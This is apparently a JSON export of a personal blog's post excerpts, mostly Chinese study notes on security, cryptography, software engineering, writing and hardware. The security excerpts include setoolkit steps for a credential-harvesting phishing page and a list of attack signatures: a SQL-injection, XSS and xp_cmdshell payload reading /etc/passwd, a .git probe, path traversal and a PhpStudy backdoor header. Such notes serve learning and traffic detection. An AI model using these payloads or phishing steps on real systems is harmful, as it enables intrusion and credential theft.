That includes headers, filenames, environment variables, registry keys, and so on. All should be considered input vectors and are therefore potential fuzz variables. Generate fuzzed data （automation） 设计输入的值？ Execute fuzzed data （automation） Monitor for exceptions（异常） Determine exploitability 2.1. LIMITATIONS AND EXPECTATIONSwe present several classes of vulnerabilities that typically go undiscovered by a fuzzer ACCESS CONTROL FLAWS(缺陷) fuzzer does not have an understanding of the logic of the program. There is no way for the fuzzer to know that the admin area should not be accessible to a regular user. POOR DESIGN LOGIC 从超出程序设计预期的的地方产生的攻击 BACKDOORS For a fuzzer, with limited or no information about the structure of a target application, a backdoor is seen no differently than any other target logic, such as a login screen. Both are simply input vectors receiving authentication credentials. 输入密码时，恶意字符可以被fuzzer发现，但硬编码密码（hard-core password）则不行 MEMORY CORRUPTION Consider, for example, a format string vulnerability that could go undetected without attaching with a debugger to the target process. MULTISTAGE VULNERABILITIES Complex attacks Often involve leveraging several vulnerabilities in succession to compromise a machine. Fuzzing might be useful for identifying the individual flaws but will not generally be valuable for chaining together a series of minor(/ˈmʌɪnə/) vulnerabilities or otherwise uninteresting events to identity a multivector attack.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"敏捷与测试驱动开发","date":"2021-11-13T21:06:44.000Z","path":"posts/55dff0b9/","slug":"敏捷与测试驱动开发","permalink":"https://hejueyun.github.io/posts/55dff0b9/","excerpt":"1. Agile Manifesto（敏捷宣言）1.1. 4 values Individuals and interactions over processes and tools（个体和互动高于流程和工具） Working software over comprehensive documentation（工作的软件高于详尽的文档） Customer collaboration over contract negotiation（客户合作高于合同谈判） Responding to change over following a plan（响应变化高于遵循计划） 1.2. 12 principles Our highest priority is to satisfy the customer through early and continuous delivery of valuable software(我们最重要的目标，是通过持续不断地及早交付有价值的软件使客户满意) 与传统的产品开发方法不同的是，敏捷原则鼓励尽量缩短从构思到发布的时间。尽快将产品送到客户手中。成功地做到这一点，意味着产品经理能够迅速将最小可行产品（minimum viable product, MVP）推出，并利用它来获得真正客户的反馈。这些反馈会被反馈到产品开发过程中，并被用来指导未来的发布 Welcome changing requirements, even late in development. Agile processes harness change for the customer’s competitive advantage(欣然面对需求变化，即使在开发后期也一样。为了客户的竞争优势，敏捷过程掌控变化) Deliver working software frequently, from a couple of weeks to a couple of months, with a preference to the shorter timescale.(经常地交付可工作的软件，相隔几星期或一两个月，倾向于采取较短的周期) Business people and developers must work together daily throughout the project(业务人员和开发人员必须相互合作，项目中的每一天都不例外) Build projects around motivated individuals. Give them the environment and support they need, and trust them to get the job done(激发个体的斗志，以他们为核心搭建项目。提供所需的环境和支援，辅以信任，从而达成目标) The most efficient and effective method of conveying information to and within a development team is face-to-face conversation.(不论团队内外，传递信息效果最好效率也最高的方式是面对面的交谈) Working software is the primary measure of progress(可工作的软件是进度的首要度量标准) 完美的、详细的文档对于工作中的软件来说是次要的。这种心态促使我们迅速将产品推向市场，而不是让文档或 “不完美就不算完成 “的心态成为一个瓶颈。衡量成功的最终标准是一个客户喜爱的工作产品。 Agile processes promote sustainable development. The sponsors, developers, and users should be able to maintain a constant pace indefinitely(敏敏捷过程倡导可持续开发。责任人、开发人员和用户要能够共同维持其步调稳定延续) Continuous attention to technical excellence and good design enhances agility.(坚持不懈地追求技术卓越和良好设计，敏捷能力由此增强) Simplicity–the art of maximizing the amount of work not done–is essential.(以简洁为本，它是极力减少不必要工作量的艺术) The best architectures, requirements, and designs emerge from self-organizing teams(最好的架构、需求和设计出自自组织团队) At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly. (团队定期地反思如何能提高成效，并依此调整自身的举动) Test-driven development is a practice commonly used by agile development teams, but it is not a core principle. 1.3. YAGNI” (You Ain’t Gonna Need It) The YAGNI principle is about maximising work not done. It states that a feature should only be implemented when it is clear that it is required, and developers should not implement something on their assumption that it will be. 2. Agile development","categories":[{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://hejueyun.github.io/categories/Software-Engineering/"}],"tags":[]},{"title":"实验：Metasploitable 2","date":"2021-11-12T10:22:37.000Z","path":"posts/b2f9d509/","slug":"实验：Metasploitable-2","permalink":"https://hejueyun.github.io/posts/b2f9d509/","excerpt":"1. Lab environment attacker: WSL2-kali 172.26.40.207 vulnerable host: Metasploitable 2 Host-Only: 192.168.138.103 ping each other 2. Lab content2.1. setoolkit1234567sudo setoolkit1 # Social-Engineering Attacks2 # Website Attack Vectors3 # Credential Harvester Attack Method1 # Web TemplatesEnter # input the attacker (my PC) local IP address2 # Google Enter: Email test and Passwd test. 2.2. Nessus","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"密码学备忘录-量子密码","date":"2021-11-09T10:10:41.000Z","path":"posts/1a4efb0b/","slug":"密码学备忘录-量子密码","permalink":"https://hejueyun.github.io/posts/1a4efb0b/","excerpt":"1. 定义量子密钥分发（英语：quantum key distribution，简称QKD）是利用量子力学特性实现密码协议的安全通信方法。它使通信的双方能够产生并分享一个随机的、安全的密钥，来加密和解密消息 An important and unique property of quantum key distribution is the ability of the two communicating users to detect the presence of any third party trying to gain knowledge of the key. This results from a fundamental aspect of quantum mechanics: the process of measuring a quantum system in general disturbs the system 量子密钥分配的一个重要和独特的属性是两个通信用户能够检测到任何试图获得密钥知识的第三方的存在。这源于量子力学的一个基本方面：测量一个量子系统的过程一般会干扰系统 2. protocol2.1. BB84 Basis 0 1 + ↑ → x ↓ ← The first step in BB84 is quantum transmission. Alice creates a random bit (0 or 1) and then randomly selects one of her two bases(基) (rectilinear(“+”，也就是R) or diagonal(“x”，D) in this case) to transmit it in. She then prepares a photon polarization state depending both on the bit value and basis, as shown in the adjacent table. So for example a 0 is encoded in the rectilinear basis (+) as a vertical polarization state, and a 1 is encoded in the diagonal basis (x) as a 135° state. Alice then transmits a single photon in the state specified to Bob, using the quantum channel. This process is then repeated from the random bit stage, with Alice recording the state, basis and time of each photon sent. Alice选出一个0-1 bit串S； Alice 逐位随机选取D或R，然后通过量子信道发送S里0，1对应生成的量子态（qbit）； Bob通过量子信道收到Alice发送的信息后，随机使用两个极化基D和R来一位一位地测量量子态，逐个得到0，1；（其后的步骤4-7都是在我们今天使用的经典通信信道上进行.而公共信道就代表此时，如果没有别的保护，攻击者完全可以窃听并修改会话内容） Bob 通过公共信道向Alice发送部分自己的测量步骤，即告诉Alice自己在每个Qbit上用的到底是D还是R来做测量； Alice 对比自己的选择和Bob的选择，然后告诉Bob他在哪些位置上用的D和R是正确的；这些正确位置在S，即Alice先选择的串中，唯一确定了另一个0-1 bit串，不妨称之为 pms，类似TLS的pre-master secret。 Bob收到Alice的回应后，随机选择若干个他在正确位上的测量结果告知Alice； Alice确认Bob的正确性。如果Bob出错，则回到1.或者终止通信，否则Alice给Bob发确认信息，同时从pms串中剔除 Bob公布的部分，剩下的作为通讯密钥； Bob收到Alice的确认信息后，同样从pms中剔除 Bob公布的部分，剩下的作为通讯密钥 如果Eve选择了与Alice相同的基去测量，则不会影响Bob的测量结果，Alice和Bob对比密钥的一部分时便不会发现有Eve的存在。但Eve仍有50%的概率会选择与Alice不同的基去测量光子，这会使光子偏振态改变，此时Bob再测量这个光子又有50%的概率得到与Alice不同的结果，从而发现有窃听者Eve的存在，Eve引入的错误的概率是25%。当所对比的密钥部分，超过p个比特出错，则这个密码被舍弃并重新传递一次，重传可选择别的量子信道。p的取值依据是，如果Eve获取的比特数少于p，则可以用隐私放大（privacy amplification）的方法减少Eve所知道消息，同时密钥的长度也被缩短了","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"信安小知识-6","date":"2021-10-12T19:31:32.018Z","path":"posts/f11654a/","slug":"信安小知识-6","permalink":"https://hejueyun.github.io/posts/f11654a/","excerpt":"1. Sqlmap space2blank Tamper(特殊空字符)1Location: https://www.mct.gov.cn/this_is_404_page?waf_detect=value+AND+1=1+UNION+ALL+SELECT+1,NULL,&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;,table_name+FROM+information_schema.tables+WHERE+2&gt;1--/**/;+EXEC+xp_cmdshell(&#x27;cat+../../../etc/passwd&#x27;)#\\ 2. GIT项目源代码探测1http://www.caeg.cn/.git/HEAD 3. 目录穿越攻击行为1234temp=/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows/.shtml/../../xhtml/css/index.css[%2F == /] 4. Nmap扫描1/nice ports,/Trinity.txt.bak 5. PhpStudy后门远程命令执行123Accept-Charset: ZGllKG1kNSgnSGVsbG9waHBTdHVkeScpKTs=die(md5(&#x27;HellophpStudy&#x27;));","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"软件工程基础-软件建构步骤","date":"2021-09-29T11:01:57.000Z","path":"posts/5eac06e6/","slug":"软件工程基础","permalink":"https://hejueyun.github.io/posts/5eac06e6/","excerpt":"1. Ideal Software Construction 理想的软件建构步骤 Problem definition Requirements development Construction planning Software architecture, or high-level design Detailed design Coding and debugging Unit testing Integration testing Integration System testing Corrective maintenance 2. algorithm vs heuristic(启发)绝对vs不确定 Here’s a heuristic for getting to someone’s house: Find the last letter we mailed you. Drive to the town in the return address. When you get to town, ask someone where our house is. Everyone knows us—someone will be glad to help you. If you can’t find anyone, call us from a public phone, and we’ll come get you 2.1. metaphor（隐喻） 在软件开发过程中，我们会碰到种类繁多的软件隐喻，例如臭虫（bug）、菜单（menu）、视窗（windows）；架构（architecture）、服务（service）、对象（object）；黑盒（black box）与白盒（white box）；瀑布（waterfall）软件模型、迭代（iterative）软件模型……这些软件隐喻无一不是从日常生活或其他科学领域中借鉴而来，根据我们原有的认知，实现一种类比的定义，并逐步发展为软件领域的固有概念 2.2. 水性沉淀物的隐喻 这并不意味着你必须学会如何用水性沉淀物制作代码；这意味着你必须学会如何每次向你的软件系统添加少量的内容。其他与增殖密切相关的词是 “增量”、”迭代”、”适应性 “和 “进化”。增量设计、构建和测试是现有的一些最强大的软件开发概念。 Incremental designing, building, and testing are some of the most powerful software-development concepts available. 2.3. incremental development 增量开发-骨架构建","categories":[{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://hejueyun.github.io/categories/Software-Engineering/"}],"tags":[]},{"title":"密码学备忘录-数学基础","date":"2021-09-27T21:37:02.000Z","path":"posts/8164bf22/","slug":"密码学笔记","permalink":"https://hejueyun.github.io/posts/8164bf22/","excerpt":"1. 辗转相除法（欧几里得算法 Euclidean algorithm） 用途：get greatest common divisor最大公约数 gcd(a,b)&#x3D;gcd(b,a%b) 12345def gcd(a, b): while b != 0: # 直到余数为0 t = a % b a,b = b,t return a 1.1. 扩展欧几里得 定理：若a和b为正整数，则存在整数x,y使得gcd(a,b)&#x3D;ax+by; 1234567def egcd(a, b): &quot;&quot;&quot;扩展欧几里得&quot;&quot;&quot; if 0 == b: return 1, 0, a x, y, q = egcd(b, a % b) x, y = y, (x - a // b * y) return x, y, q 2. 剩余类（residue class）把所有与整数a模n同余的整数构成的集合叫做模n的一个剩余类 并把a叫作剩余类[a]的一个代表元","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[]},{"title":"academic-writing-摘录","date":"2021-09-04T14:24:23.000Z","path":"posts/768d3857/","slug":"academic-writing-摘录","permalink":"https://hejueyun.github.io/posts/768d3857/","excerpt":"1. 摘录 Against this backdrop 在此背景下 Research in wellbeing has been growing in recent decades To advance pratice 为推进实践 facilitate learning 促进学习 As xx further suggests Russell et al.’s (2010) study aimed to determine (whether) … Russell et al. (2010) investigated (the extent to which) … Russell et al. (2010) examined (the) Russell (2010) explain that Acoording to Russell’s (2010) research case studies outlined by Griffiths (1998) and Young (1996b) illustrate that代替relationship： find a correlation with A and B A theme that will run through this paper is … This was reflected by 这体现为… These findings can suggest a number of things, specifically, that the majority indicated a negative impact Responding to student mental health problems now appears to be an inevitable(不可回避的) part of the role of an academic. unavoidable express the view that they were seeing an increase in the prevalence(普遍性) of mental health difficulties. there was a lack of However, there was a lack of clarity around the term ‘xx’, resulting in there was no clear defination of ‘xx’ academic problems almost always have a non-academic cause. leads to in distress in trouble\\face challenge benefit from A lack of time to devote to students with mental health problems was also highlighted by a similar staff survey (Wassall, 1999) undertaken at the University of Aberdeen","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"academic-writing-进阶","date":"2021-09-04T13:47:46.000Z","path":"posts/634d3f5d/","slug":"academic-writing-进阶","permalink":"https://hejueyun.github.io/posts/634d3f5d/","excerpt":"1. Reduce Wordiness Eliminate filler words 即不要做无用的hedge Remove redundancies 删除含义重复的部分 Avoid overusing qualifiers 这往往是使用了过多的副词来修饰形容词 Logorrhea 过度的词藻和重复性 e.g (Ambiguity and uncertainty) 2. Redundency表现： Repetition of ideas and&#x2F;or words that have the same meaning Over-explaining and giving too much unnecessary detail Repetitive sentences and lack of cohesion Use of adjectives and adverbs that don’t add to meaning. Going off-topic. 2.1. Reduced relative clauses3. passive voice misuse The Passive Voice in Academic Writing 3.1. 何时用","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"seminar笔记","date":"2021-08-28T20:23:57.000Z","path":"posts/2dbe0ee9/","slug":"seminar笔记","permalink":"https://hejueyun.github.io/posts/2dbe0ee9/","excerpt":"1. 技巧1.1. 中性观点（Neutral opinions）123In my opinion …….Personally, I think ……I feel that… 1.2. 初步想法（Tentative opinions）12It seems/appears to me that ….I tend to think that. 1.3. 同意（Agreeing）1I completely/entirely agree 1.4. 不同意（disagreeing）123No, I don’t (really) agree (with you).I’m afraid I disagree. But there’s no evidence for that. 1.5. 部分同意&#x2F;保留意见（Partial agreement &#x2F; expressing reservations）","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"academic writing笔记","date":"2021-08-28T20:23:46.000Z","path":"posts/45cac883/","slug":"academic-writing笔记","permalink":"https://hejueyun.github.io/posts/45cac883/","excerpt":"1. 词汇1.1. general vs specific 加了限定范围or用了关系性从句一般就要加the 反过来你加了the，就要想办法specific Uncountable nouns general : specfic : the Countable singular nouns genearl : a&#x2F;an speific : the Countable plural nouns 1.2. academic word list general academic discipline specific nominalisation 名词化 1.3. 连接词(Linking words) 什么时候连接词： 当你前后两个句子描述主体未发生变化时可以不用（此时往往以This ...开头） 当描述主体发生变化时再用 1.3.1. 分号（semicolon）","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"The Plain Bagel笔记 2","date":"2021-08-25T16:51:17.000Z","path":"posts/96acfc1f/","slug":"The-Plain-Bagel笔记-2","permalink":"https://hejueyun.github.io/posts/96acfc1f/","excerpt":"1. Bitcoin 比特币是高风险 比特币和区块链是两回事 比特币可以作为区块链的一部分，但非必要，即在区块链中是可以被取代的 区块链有价值不代表比特币就有价值，和“电脑与软件”的关系一样 speculate投机（炒&#x2F;倒卖） 投资是看重产品的内在价值，但投机（比如比特币）是可以没有价值的 如果跌了投资至少有价值保底，不会跌到离谱 比特币的价格同样会收到现实货币（利率）的影响 比特币不需要中间人，但中间人并非百害无一利：可以提供安全保障、高频交易等 比特币与泡沫有很多相似之处 新鲜事物、有未来预期等 买卖循环推高价格 不懂行的人也开始参与 2. central bank - intersts rateovernight rate 隔夜利率是银行在一天结束时在隔夜市场上相互借出资金的利率。 这些借贷活动的目的是为了确保维持联邦规定的准备金要求。 隔夜利率是更广泛的经济中短期利率变动的预测器，并能对各种经济指标如就业和通货膨胀产生多米诺效应。 隔夜利率越高，消费者借钱就越贵。 一般利率也就指的是这个 利率更低，借贷越便宜，一般为了从经济危机走出来就要把利率拉低 那为啥要调高呢：避免过分通货膨炸，导致大部分人资产缩水 提高利率，之前买的股票和债券都会贬值 3. Market Index - Index FundMarket Index 市场指数提供了一个具有广泛代表性的投资持有组合。(一种数学计算、用于跟踪股票市场) 构建单个指数的方法各不相同，但几乎所有的计算都是基于加权平均数的。 指数被用作衡量市场部分的运动和表现的基准。 投资者使用指数作为投资组合或被动指数投资的基础。 道琼斯工业平均指数 (Dow Jones Industrial Average) 30个工业股 平均股价 本身没有意义，变化的百分率才有意义 Index比US Stock的数量还多","categories":[],"tags":[]},{"title":"新闻杂谈","date":"2021-08-22T21:03:39.000Z","path":"posts/fc070077/","slug":"新闻杂谈","permalink":"https://hejueyun.github.io/posts/fc070077/","excerpt":"最近思考为何自己会不断地在消息过量与消息不足之间徘徊，甚至为了逃避烦恼卸载了知乎，但仍未从根本上解决问题。如今想来，自己在保持审慎上花费了太多力气，以至于最终滑向了视频网站，逃避思考。但在当下重归论坛是不合时宜的，如今在知乎已经无法检索文革等相关信息，加上广告流量的涌入，已经不再适合作为“新闻平台”。在社交媒体、或者是门户网站，无疑是再吃二手 同时应该注意，以下的这些（媒体）渠道，有些是只有“新闻报道”本身可信，其围绕报道内容的“社论”则不值一提，尤其是警惕媒体用正确的数字得出错误的统计结论，不要高估媒体人在其专业之外的能力 1. 国务院新闻办公厅更新频率：周 理论研究 2. 统计局更新频率：季度 国家数据 统计知识 3. 外交部更新频率：1-3日","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"传播学","slug":"essay/传播学","permalink":"https://hejueyun.github.io/categories/essay/%E4%BC%A0%E6%92%AD%E5%AD%A6/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"The Plain Bagel笔记","date":"2021-08-18T15:20:48.000Z","path":"posts/3bc77168/","slug":"The-Plain-Bagel笔记","permalink":"https://hejueyun.github.io/posts/3bc77168/","excerpt":"1. The Fundamentals | Why is Investing Important?1.1. term money market instruments 货币市场工具 return 回报 annual percentage 年化？ 好像不是,是interest rate What Is an Annual Percentage Rate (APR)? An annual percentage rate (APR) is the annual rate charged for borrowing or earned through an investment. Financial institutions must disclose a financial instrument’s APR before any agreement is signed. Consumers may find it difficult to compare APRs, because lenders have the power to choose what charges are included in their rate calculation. An APR may not reflect the actual cost of borrowing because of the fees that are included or excluded. 年利率（APR）是指对借贷或通过投资赚取的年利率。 金融机构必须在签署任何协议之前披露金融工具的年利率。 消费者可能会发现很难比较年利率，因为贷款人有权力选择哪些费用包括在他们的利率计算中。 由于包括或不包括的费用，年利率可能不反映实际的借贷成本。 投资两大概念 risk-return trade-off 风险-收益权衡 diversification 多样化 uncorrelated 不相关的 比如同时投资两个汽车企业，如果整个汽车行业不景气，那两个都会受灾 inflation 通货膨胀 The overall increase of cosumer good prices purchasing power 购买力 购买力是指用一个单位的货币可以购买的商品和服务的数量。例如，如果一个人在20世纪50年代拿着一单位的货币去商店，就有可能买到比现在更多的物品，这表明货币在20世纪50年代具有更大的购买力。货币既可以是商品货币(commodity money)，如黄金或白银，也可以是由政府认可的机构发行的法定货币(fiat money)。 1.2. concept 规律：越早投资越好，因为复利的存在，整体积累（accumulate）是指数增长的","categories":[],"tags":[]},{"title":"[主机]NR200装机杂谈","date":"2021-07-07T11:26:54.000Z","path":"posts/45f6f037/","slug":"主机-NR200装机杂谈","permalink":"https://hejueyun.github.io/posts/45f6f037/","excerpt":"1. 前言之前组好的主机长时间没用，导致内存出了点问题，然后就体会到了拆装机的痛苦了，就算把电源外置也没法解决理线和散热的痛苦，于是一气之下直接换了2020年大火的NR200。原因如下： 现货秒发，不想再受定制机箱耍猴的痛苦了 安装简便，虽然之前没有特别了解过具体装机流程但应该没问题 散热优秀 比想象中小，之前一直以为是20多，后来发现是18L，感觉还能接受 2. Price Item Price NR200 399 SEAGATE ST3000VX010 3T 519 3. 装机具体的装机可参考B站教程，这里说几个比较有意思的点 底面风扇安装很自由，原本以为换了机箱我的两个6cm猫扇就浪费了，没想到可以通过胶钉装(虽然有点点容易卡出来)","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"杂玩","slug":"essay/toys","permalink":"https://hejueyun.github.io/categories/essay/toys/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"外设-hifi小烧闲谈","date":"2021-06-15T14:34:51.000Z","path":"posts/a78f415f/","slug":"外设-hifi小烧闲谈","permalink":"https://hejueyun.github.io/posts/a78f415f/","excerpt":"1. 前言闲来无事，记录一下目前烧hifi(?)的经历。 起因的话 （主要）看动漫的姿势水平提高了(?)，有了需求 看了gigguk对ost重要性的科普 （客观）从WEB党转为了下载党，声音的差别被放大了 单纯拜物教&#x2F;数码宅&#x2F;消费欲&#x2F;… 其实之前对音乐这块一直是敬而远之的，毕竟音痴，而且音乐也完全不懂鉴赏的技巧。 然后入门的话主要参考了鬼斧神工119和lprsyofCIvTR，其实也主要和选购和设备调试之类相关，像什么听音观啊音乐史啊还是完全无知。 另外本文只是hifi杂谈，所以用过的游戏耳机就不会入列了。 2. 耳机2.1. 选购只谈本人用过的耳机","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"杂玩","slug":"essay/toys","permalink":"https://hejueyun.github.io/categories/essay/toys/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"linux笔记","date":"2021-06-11T18:49:10.000Z","path":"posts/638d4d8a/","slug":"linux笔记","permalink":"https://hejueyun.github.io/posts/638d4d8a/","excerpt":"1. 11.1. 字符编码系统 ASCII：1字节，只用于英文 Unicode：UTF-8 1.2. 操作系统操作系统&#x3D;内核+系统调用 内核层(kernel) 管理硬件的程序 如果你的内核不支持网络协议，那么就算你的电脑有网卡也无济于事 内核程序放置于内存中的受保护区域(?) 内核程序是守护程序 系统调用层(system call) 提供API调用内核 应用程序的开发都是参考操作系统提供的API，所以该应用程序只能在该系统上运行 封装：硬件→（内核→系统调用）→应用程序(壳程序)","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Basic","slug":"Operating-System/Linux/Basic","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Basic/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"[外设]Cheap 60键盘组装记录","date":"2021-06-01T22:54:50.000Z","path":"posts/7a6bc0ab/","slug":"外设-Cheap-60键盘组装记录","permalink":"https://hejueyun.github.io/posts/7a6bc0ab/","excerpt":"1. 前言购买这个套件纯属偶然，就是突然兴起逛了一下装备前线，然后就到了cheap60套件，看着产品图感觉符合审美要求，而且用的gasket结构要比在用的托盘要好——虽然我当时完全不知道gasket是啥。 cheap60给我提供了一个廉价的双模键盘方案。同时，考虑到以前已经用过左移64，想体验一下新的布局。标准60左右较为对称，感觉观感会不错。最重要的是，之前ttc静音茶没能让我完全满意，借这次机会要实现终极静音。 1.1. tray mount vs gasket mounttray mount托盘结构 键盘外壳的底板有螺钉孔，螺丝贯穿定位板和PCB固定整个键盘。 PCB和定位板以及外壳需要share相同的螺丝位从而拼到一起。 优点 结构简单 安装方便 缺点 手感一致性差，尤其是四个角可能空腔音比较大 Gasket mount垫片结构 螺丝只串起外壳，内胆没有刚性结构和螺丝支撑，全靠橡胶和上下盖精度压死在键盘中间。","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"杂玩","slug":"essay/toys","permalink":"https://hejueyun.github.io/categories/essay/toys/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"[主机]小新pro14 2021体验及装机指北","date":"2021-04-08T14:49:14.000Z","path":"posts/69d0feff/","slug":"外设-小新pro14-2021体验及装机指北","permalink":"https://hejueyun.github.io/posts/69d0feff/","excerpt":"1. 前言之前一直在用nuc8 i7BEK8559U，便宜大腕。换配置主要出于几点原因： 风扇吵，就算在bios调整了曲线也是动不动起飞 准系统不能完全代替笔电的使用场景 四核打开个直播网页有点卡正好看到有小新pro的首发就抢了一波 2. 配置及测试 参数 配置 CPU Zen3 R7 5800H iGpu Radeon Vega8 2000Hz Memory 8x2 32000Hz SSD 512GB Monitor 14inch 2.2k wifi Intel AX200 Battery 61Wh 2.1. CPU性能测试 cinebench r20 单&#x2F;双核 结果和B站上的评测差不多，但和cpu-monkey上5000+的成绩有不小差距 在实际体验上和之前的8559U有了涨足的进步，但似乎仍却不如台式上的3500X打开网页那么顺滑，也许和内存也有关系吧 2.2. gpu性能测试","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"杂玩","slug":"essay/toys","permalink":"https://hejueyun.github.io/categories/essay/toys/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"js-ninja","date":"2021-03-25T21:47:51.000Z","path":"posts/c579fa28/","slug":"js-ninja","permalink":"https://hejueyun.github.io/posts/c579fa28/","excerpt":"1. 1. JS使用环境由于更先进的JvaScript engines和frameeworks（ Node, Apache Cordova, Ionic, and Electron）的发明，JS几乎可以做任何事 1.1. JS是更为面向函数的（functionally oriented） 函数可被视为对象 可以被常量创建 被变量引用 被当作函数变量传递 被作为返回值返回 支持函数闭包 当一个函数主动地保存一个外部变量就可将这个函数称为闭包 作用域 JS不像C++那样有块级（block-level variables ）作用域 只用全局和函数两种级别的作用域 基于原型的面向对象（Prototype-based object orientation） 区别于基于类的（Class-based） 最主要的区别：Class中，类和实例不同；Prototype中，凡对象均为实例 1.2. JS需要关注的特性 生成器（generator） 类似Python，即一个可以在两个请求之间暂停的函数 约定（promise） 更好地控制异步代码 代理（proxy） 控制对特定对象的访问 高级数组方法（advanced array methods） 哈希（map） 正则式（regular expression） 模块（module） 1.3. JS演进 ECMAScript委员发布新版本，比如(ES7&#x2F;ES2016) 注意这只是标准的更新，要实际运用得等到JS引擎更新才行 但不同于Python，js引擎是由用户浏览器决定的 所以需要转译器（transpiler，又称源代码到源代码编译器source-to-source compile，翻译器transcompiler） 以某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器 For example, converting C++ code to C code will involve a transpiler. 在这个语境下，是指将高端的JS代码转换为等效兼容的JS代码 1.4. 浏览器工作原理","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Javascript","slug":"Program-Language/Javascript","permalink":"https://hejueyun.github.io/categories/Program-Language/Javascript/"},{"name":"Basic","slug":"Program-Language/Javascript/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Javascript/Basic/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://hejueyun.github.io/tags/notes/"}]},{"title":"js_DOM","date":"2021-02-28T13:10:29.000Z","path":"posts/3dae438f/","slug":"js-DOM","permalink":"https://hejueyun.github.io/posts/3dae438f/","excerpt":"1. DHTML 动态HTML HTML：网页 –标记为–&gt; 元素 CSS：设计元素的排版样式以及在窗口中的显示位置 JS：实时改变样式 css-js：css先静态设定样式，再由js动态改变 DHTML最终实现：DOM 1.1. 标准问题：DOM兼容性解决：W3C 2. js语法2.1. 插入1234567891011# 嵌入html&lt;script type=&quot;text/javascript&quot;&gt;...&lt;/script&gt;# 存入独立文件，src指向&lt;script type=&quot;text/javascript&quot; scr=&quot;file.js&quot;&gt;&lt;/script&gt; 2.2. 语法","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Javascript","slug":"Program-Language/Javascript","permalink":"https://hejueyun.github.io/categories/Program-Language/Javascript/"},{"name":"Basic","slug":"Program-Language/Javascript/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Javascript/Basic/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://hejueyun.github.io/tags/notes/"}]},{"title":"[主机]风冷快乐盒M组装记录","date":"2021-01-17T12:54:32.000Z","path":"posts/5200a480/","slug":"主机-风冷快乐盒M组装记录","permalink":"https://hejueyun.github.io/posts/5200a480/","excerpt":"1. 引言一直想组装一台便携的gaming pc，而笔记本的性能释放、寿命与性价比也是令人捉急，于是最终敲定组装sffpc。 目标：10L以内。 预算：6k左右 性能：守望先锋、战地一等网游在1080p下能有144hz；刺客信条、大镖客2等单机在60帧的基础上有不错的画质 可能的话还会用于编程 体验：安静、在itx标准下尽量低温 2. 配置 目录 配件 价格 主板 Gigabyte B450i 见下 CPU AMD R5 3500x 板U套装 1679 显卡 Gigabyte GTX 1660 SUPER MINI ITX OC 1529 电源 Cosair SF450 电源模组线套装 629 内存 Klevv CJR DDR4-2666 x2 339 固态硬盘 